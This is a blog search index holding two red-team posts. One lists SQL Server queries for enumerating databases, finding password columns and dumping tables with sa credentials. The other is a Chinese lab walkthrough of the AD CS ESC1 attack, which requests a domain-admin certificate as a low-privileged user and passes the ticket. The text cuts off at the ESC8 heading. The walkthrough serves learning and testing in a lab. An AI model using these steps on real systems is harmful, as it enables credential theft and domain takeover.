<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Sqlserver focus command</title>
      <link href="2021/08/16/sqlserver-focus-command/"/>
      <url>2021/08/16/sqlserver-focus-command/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">Record a tips, maybe somebody&amp;RT can useThe other day ON the T00ls forum, I saw a tool released by a black production team and documented some tips that the Red team could use<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="View-the-host-name-and-user-connected-to-the-database"><a href="#View-the-host-name-and-user-connected-to-the-database" class="headerlink" title="View the host name and user connected to the database"></a>View the host name and user connected to the database</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> loginame<span class="token punctuation">,</span> hostname <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sysprocesses<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812230659893.png"></p><h2 id="Obtaining-Database-Information"><a href="#Obtaining-Database-Information" class="headerlink" title="Obtaining Database Information"></a>Obtaining Database Information</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysdatabases<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812230748957.png"></p><h3 id="Obtain-the-database-size-information"><a href="#Obtain-the-database-size-information" class="headerlink" title="Obtain the database size information"></a>Obtain the database size information</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> d<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token function">ROUND</span><span class="token punctuation">(</span><span class="token function">SUM</span><span class="token punctuation">(</span>mf<span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>master_files mf <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span><span class="token keyword">databases</span> d <span class="token keyword">ON</span> d<span class="token punctuation">.</span>database_id <span class="token operator">=</span> mf<span class="token punctuation">.</span>database_id <span class="token keyword">WHERE</span> d<span class="token punctuation">.</span>database_id <span class="token operator">></span> <span class="token number">4</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> d<span class="token punctuation">.</span>name <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> d<span class="token punctuation">.</span>name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812230930949.png"></p><h2 id="Specifies-all-tables-in-the-database"><a href="#Specifies-all-tables-in-the-database" class="headerlink" title="Specifies all tables in the database"></a>Specifies all tables in the database</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> LazyOA<span class="token punctuation">;</span> <span class="token keyword">exec</span> sp_tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812233307074.png"></p><h2 id="Specifies-the-number-of-database-rows"><a href="#Specifies-the-number-of-database-rows" class="headerlink" title="Specifies the number of database rows"></a>Specifies the number of database rows</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">USE</span> LazyOA <span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">100</span> s<span class="token punctuation">.</span>Name <span class="token keyword">AS</span> SchemaName<span class="token punctuation">,</span> t<span class="token punctuation">.</span>Name <span class="token keyword">AS</span> TableName<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token keyword">rows</span> <span class="token keyword">AS</span> RowCounts<span class="token punctuation">,</span> CAST<span class="token punctuation">(</span><span class="token function">ROUND</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">SUM</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>total_pages<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">128.00</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> Total_MB <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">tables</span> t <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>indexes i <span class="token keyword">ON</span> t<span class="token punctuation">.</span>OBJECT_ID <span class="token operator">=</span> i<span class="token punctuation">.</span>object_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>partitions p <span class="token keyword">ON</span> i<span class="token punctuation">.</span>object_id <span class="token operator">=</span> p<span class="token punctuation">.</span>OBJECT_ID <span class="token operator">AND</span> i<span class="token punctuation">.</span>index_id <span class="token operator">=</span> p<span class="token punctuation">.</span>index_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>allocation_units a <span class="token keyword">ON</span> p<span class="token punctuation">.</span>partition_id <span class="token operator">=</span> a<span class="token punctuation">.</span>container_id <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> sys<span class="token punctuation">.</span>schemas s <span class="token keyword">ON</span> t<span class="token punctuation">.</span>schema_id <span class="token operator">=</span> s<span class="token punctuation">.</span>schema_id <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> t<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> s<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token keyword">Rows</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> RowCounts <span class="token keyword">desc</span><span class="token punctuation">,</span> Total_MB  <span class="token keyword">desc</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812231339381.png"></p><h2 id="Specifies-the-rows-in-the-data-table"><a href="#Specifies-the-rows-in-the-data-table" class="headerlink" title="Specifies the rows in the data table"></a>Specifies the rows in the data table</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812231646980.png"></p><h2 id="Specifies-the-first-10-entries-in-the-data-table"><a href="#Specifies-the-first-10-entries-in-the-data-table" class="headerlink" title="Specifies the first 10 entries in the data table"></a>Specifies the first 10 entries in the data table</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812231817603.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> LazyOA<span class="token punctuation">;</span> <span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token keyword">from</span> Sys_Role<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812231921294.png"></p><h2 id="Specify-database-column-name-search"><a href="#Specify-database-column-name-search" class="headerlink" title="Specify database column name search"></a>Specify database column name search</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> COLUMN_NAME <span class="token keyword">as</span> <span class="token string">'ColumnName'</span><span class="token punctuation">,</span> TABLE_NAME <span class="token keyword">as</span>  <span class="token string">'TableName'</span> <span class="token keyword">from</span> LazyOA<span class="token punctuation">.</span>INFORMATION_SCHEMA<span class="token punctuation">.</span><span class="token keyword">COLUMNS</span> <span class="token keyword">where</span> COLUMN_NAME <span class="token operator">like</span> <span class="token string">'%pass%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812232042788.png"></p><h2 id="Specifying-data-Export"><a href="#Specifying-data-Export" class="headerlink" title="Specifying data Export"></a>Specifying data Export</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">local</span> loginsqlcmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>S localhost <span class="token operator">-</span>E <span class="token operator">-</span>Q <span class="token string">"select * from %databasename%.dbo.%tablename%"</span> <span class="token operator">-</span>W <span class="token operator">-</span>s<span class="token string">"|"</span> <span class="token operator">-</span>o <span class="token string">"C:\Windows\Temp\1.txt"</span>special loginsqlcmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>S localhost <span class="token operator">-</span>U sa <span class="token operator">-</span>P admin  <span class="token operator">-</span>Q <span class="token string">"select * from LazyOA.dbo.Sys_User"</span> <span class="token operator">-</span>W <span class="token operator">-</span>s<span class="token string">"|"</span> <span class="token operator">-</span>o <span class="token string">"C:\Users\dbadmin\Desktop\1\1.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20focus%20command/image-20210812233018443.png"></p>]]></content>
      
      
      <categories>
          
          <category> Miscellaneous record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Information collection </tag>
            
            <tag> Sqlserver </tag>
            
            <tag> Database </tag>
            
            <tag> Command execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADCS&amp;ESC1&amp;ESC8攻击方式</title>
      <link href="2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/"/>
      <url>2021/08/16/adcs-esc1-esc8-gong-ji-fang-shi/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">内容太多了，实在不想翻出来英文版本了，这回就中文冲了，凑合看即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">利用方式Certified Pre-Owned: Abusing Active Directory Certificate Services出自于black hat2021https:&#x2F;&#x2F;www.blackhat.com&#x2F;us-21&#x2F;briefings&#x2F;schedule&#x2F;#certified-pre-owned-abusing-active-directory-certificate-services-23168ad cs白皮书：https:&#x2F;&#x2F;www.specterops.io&#x2F;assets&#x2F;resources&#x2F;Certified_Pre-Owned.pdf强烈建议看下文前先过一遍议题&amp;白皮书，可以避免很多坑点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><h3 id="PKI（Public-Key-Infrastructure公钥基础设施）"><a href="#PKI（Public-Key-Infrastructure公钥基础设施）" class="headerlink" title="PKI（Public Key Infrastructure公钥基础设施）"></a>PKI（Public Key Infrastructure公钥基础设施）</h3><pre class="line-numbers language-none"><code class="language-none">软件、加密技术、流程和服务的组合，使得组织能够保护其数据、通信、业务交易，PKI依赖于经过身份验证的用户和受信任资源之间的数字证书交换，可以用证书来保护数据并管理来自组织内外的用户和计算机身份凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><pre class="line-numbers language-none"><code class="language-none">一个服务器角色，提供PKI功能，支持windows域上身份和其他安全功能如文件加密、邮件加密等，可以为组织内部使用创建、验证、撤销公钥证书通俗来说ADCS角色是实施PKI解决方案，ADCS允许构建公钥基础设置并为组织提供公钥加密、数字证书、数字签名的功能ADCS提供所有与PKI相关的组件作为角色服务，每个角色负责证书基础架构的特定部分，同时协同完成完整解决方案<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="认证机构"><a href="#认证机构" class="headerlink" title="认证机构"></a>认证机构</h4><pre class="line-numbers language-none"><code class="language-none">CA的主要目的是办法证书、撤销证书及发布授权信息方式和撤销信息，部署的第一个CA将成为PKI的根，随后可以部署位于PKI层次结构中的从属CA，根CA位于顶部，从属CA隐式信任根CA，并信任他颁布的cert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="证书颁发机构web注册"><a href="#证书颁发机构web注册" class="headerlink" title="证书颁发机构web注册"></a>证书颁发机构web注册</h4><pre class="line-numbers language-none"><code class="language-none">使得用户使用未加入域或运行windows以外的设备下进行证书颁发续订的操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Onlie-responder"><a href="#Onlie-responder" class="headerlink" title="Onlie responder"></a>Onlie responder</h4><pre class="line-numbers language-none"><code class="language-none">配置管理在线证书状态协议OCSP验证和吊销检查，在线响应程序解码特定证书的吊销状态请求，评估这些证书的状态，并返回具有请求的证书状态信息的签名响应<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="网络设备注册服务（NDES）"><a href="#网络设备注册服务（NDES）" class="headerlink" title="网络设备注册服务（NDES）"></a>网络设备注册服务（NDES）</h4><pre class="line-numbers language-none"><code class="language-none">通过该组件，路由器交换器或其他设备可以从adcs获取证书<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="证书注册web服务（CES）"><a href="#证书注册web服务（CES）" class="headerlink" title="证书注册web服务（CES）"></a>证书注册web服务（CES）</h4><pre class="line-numbers language-none"><code class="language-none">用于运行windows的计算机和ca之间的代理客户端，ces使用户、计算机或者应用程序能够通过使用户web服务连接到ca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="证书注册策略web服务"><a href="#证书注册策略web服务" class="headerlink" title="证书注册策略web服务"></a>证书注册策略web服务</h4><pre class="line-numbers language-none"><code class="language-none">使得用户能够获取证书注册策略信息，结合CES，可以在用户设备未加入域或无法连接域控的情况下基于策略的证书注册<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="图片介绍"><a href="#图片介绍" class="headerlink" title="图片介绍"></a>图片介绍</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172411337.png"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><pre class="line-numbers language-none"><code class="language-none">功能安装处如下选择：证书颁发机构证书颁发机构web注册证书注册web服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103047564.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103130284.png"></p><h3 id="配置服务"><a href="#配置服务" class="headerlink" title="配置服务"></a>配置服务</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103341653.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172508459.png"></p><pre class="line-numbers language-none"><code class="language-none">如下选择进行服务的细节配置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103412505.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103433153.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103458913.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103527977.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103548543.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103609920.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103620572.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103638717.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103651916.png"></p><h3 id="配置证书注册web服务"><a href="#配置证书注册web服务" class="headerlink" title="配置证书注册web服务"></a>配置证书注册web服务</h3><pre class="line-numbers language-none"><code class="language-none">上一步完成会告诉你是否要配置其他角色服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103751908.png"></p><pre class="line-numbers language-none"><code class="language-none">依次如下配置即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103905088.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103919750.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103942267.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103951717.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813104034198.png"></p><h3 id="搭建完效果如下"><a href="#搭建完效果如下" class="headerlink" title="搭建完效果如下"></a>搭建完效果如下</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813105753003.png"></p><h3 id="辅助域控搭建"><a href="#辅助域控搭建" class="headerlink" title="辅助域控搭建"></a>辅助域控搭建</h3><pre class="line-numbers language-none"><code class="language-none">这里是把adcs搭成了辅助域控<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155635888.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155651462.png"></p><pre class="line-numbers language-none"><code class="language-none">配置如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p><pre class="line-numbers language-none"><code class="language-none">主从复制<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p><pre class="line-numbers language-none"><code class="language-none">一步步直接操作即可，按照提示完成相关的操作即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172343449.png"></p><h2 id="证书颁发机构信息获取"><a href="#证书颁发机构信息获取" class="headerlink" title="证书颁发机构信息获取"></a>证书颁发机构信息获取</h2><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre class="line-numbers language-none"><code class="language-none">域内成员可成功定位到ca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172332440.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172322940.png"></p><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">获得ca名称<span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Active更多细节信息<span class="token variable">$CAName</span> = <span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Active<span class="token punctuation">;</span><span class="token function">Get-Itemproperty</span> <span class="token operator">-</span>Path “HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<span class="token variable">$CAName</span>”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172313339.png"></p><h3 id="测试联通性"><a href="#测试联通性" class="headerlink" title="测试联通性"></a>测试联通性</h3><pre class="line-numbers language-none"><code class="language-none">确认NTLM协议（后面中继要用）curl http:&#x2F;&#x2F;192.168.3.73&#x2F;certsrv -I<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172301814.png"></p><h2 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h2><pre class="line-numbers language-none"><code class="language-none">个人原因，ESC1在部署的另外一套环境测试，也是同样的上方部署方式即可这里其实是有些坑点的，此处万分感谢李木师傅的解答~~~~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><pre class="line-numbers language-none"><code class="language-none">攻击者可以在证书服务请求中指定主体名称，则请求者可以请求任何人（域管）的证书<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h3><pre class="line-numbers language-none"><code class="language-none">进入证书模板配置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172252110.png"></p><pre class="line-numbers language-none"><code class="language-none">如下进行配置（存在客户端身份验证就行）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172242388.png"></p><pre class="line-numbers language-none"><code class="language-none">允许注册<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172230565.png"></p><pre class="line-numbers language-none"><code class="language-none">如下配置在请求中提供<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172222795.png"></p><pre class="line-numbers language-none"><code class="language-none">建议拷贝个模板出来做实验!!!如此将允许低权限用户使用任意SAN请求证书，从而允许低权限用户通过kerberos或schannel作为域中任何主体进行身份验证若允许这些设置的已发布证书模板，攻击者可以作为环境中的任何人请求证书，使用该证书为用户获取TGT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">使用漏洞发布者的工具即可域机器运行后如下，显示存在ESC1漏洞CA                      : yangdc.yangsir.git\yangsir-YANGDC-CAName                    : 用户 的副本SchemaVersion           : 2OID                     : 1.3.6.1.4.1.311.21.8.10154165.557338.9848748.4027908.13133259.250.6500742.4833607VulnerableTemplateACL   : FalseLowPrivCanEnroll        : TrueEnrolleeSuppliesSubject : TrueEnhancedKeyUsage        : 客户端身份验证 (1.3.6.1.5.5.7.3.2)|安全电子邮件 (1.3.6.1.5.5.7.3.4)|加密文件系统 (1.3.6.1.4.1.311.10.3.4)HasAuthenticationEku    : TrueHasDangerousEku         : FalseEnrollmentAgentTemplate : FalseCAManagerApproval       : FalseIssuanceRequirements    : [Issuance Requirements]                            Authorized signature count: 0                            Reenrollment requires: same criteria as for enrollment.ValidityPeriod          : 1 yearsRenewalPeriod           : 6 weeksOwner                   : YANGSIR\AdministratorDACL                    : NT AUTHORITY\Authenticated Users (Allow) - Read, Enroll                          YANGSIR\Administrator (Allow) - Read, Write                          YANGSIR\Domain Admins (Allow) - Read, Write, Enroll                          YANGSIR\Domain Users (Allow) - Enroll                          YANGSIR\Enterprise Admins (Allow) - Read, Write, EnrollMisconfigurations       : ESC1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172202595.png"></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">通过普通域用户申请证书，注意UPN需要为域管<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172150232.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172140403.png"></p><pre class="line-numbers language-none"><code class="language-none">确认申请成功如下，为administrator权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172131605.png"></p><pre class="line-numbers language-none"><code class="language-none">确认使用者信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172123019.png"></p><pre class="line-numbers language-none"><code class="language-none">导出证书certutil -user -exportPFX sha1 yangsirdomainuser.pfx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172115476.png"></p><pre class="line-numbers language-none"><code class="language-none">此处通过凭证进行PTT出现失败，后推测可能是时间同步的问题<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172050369.png"></p><pre class="line-numbers language-none"><code class="language-none">对机器重启后，再次PTT即可成功，使用先前导出的凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172024825.png"></p><pre class="line-numbers language-none"><code class="language-none">确认凭证信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815171956871.png"></p><pre class="line-numbers language-none"><code class="language-none">确认可成功获取权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815171943256.png"></p><h2 id="ESC8"><a href="#ESC8" class="headerlink" 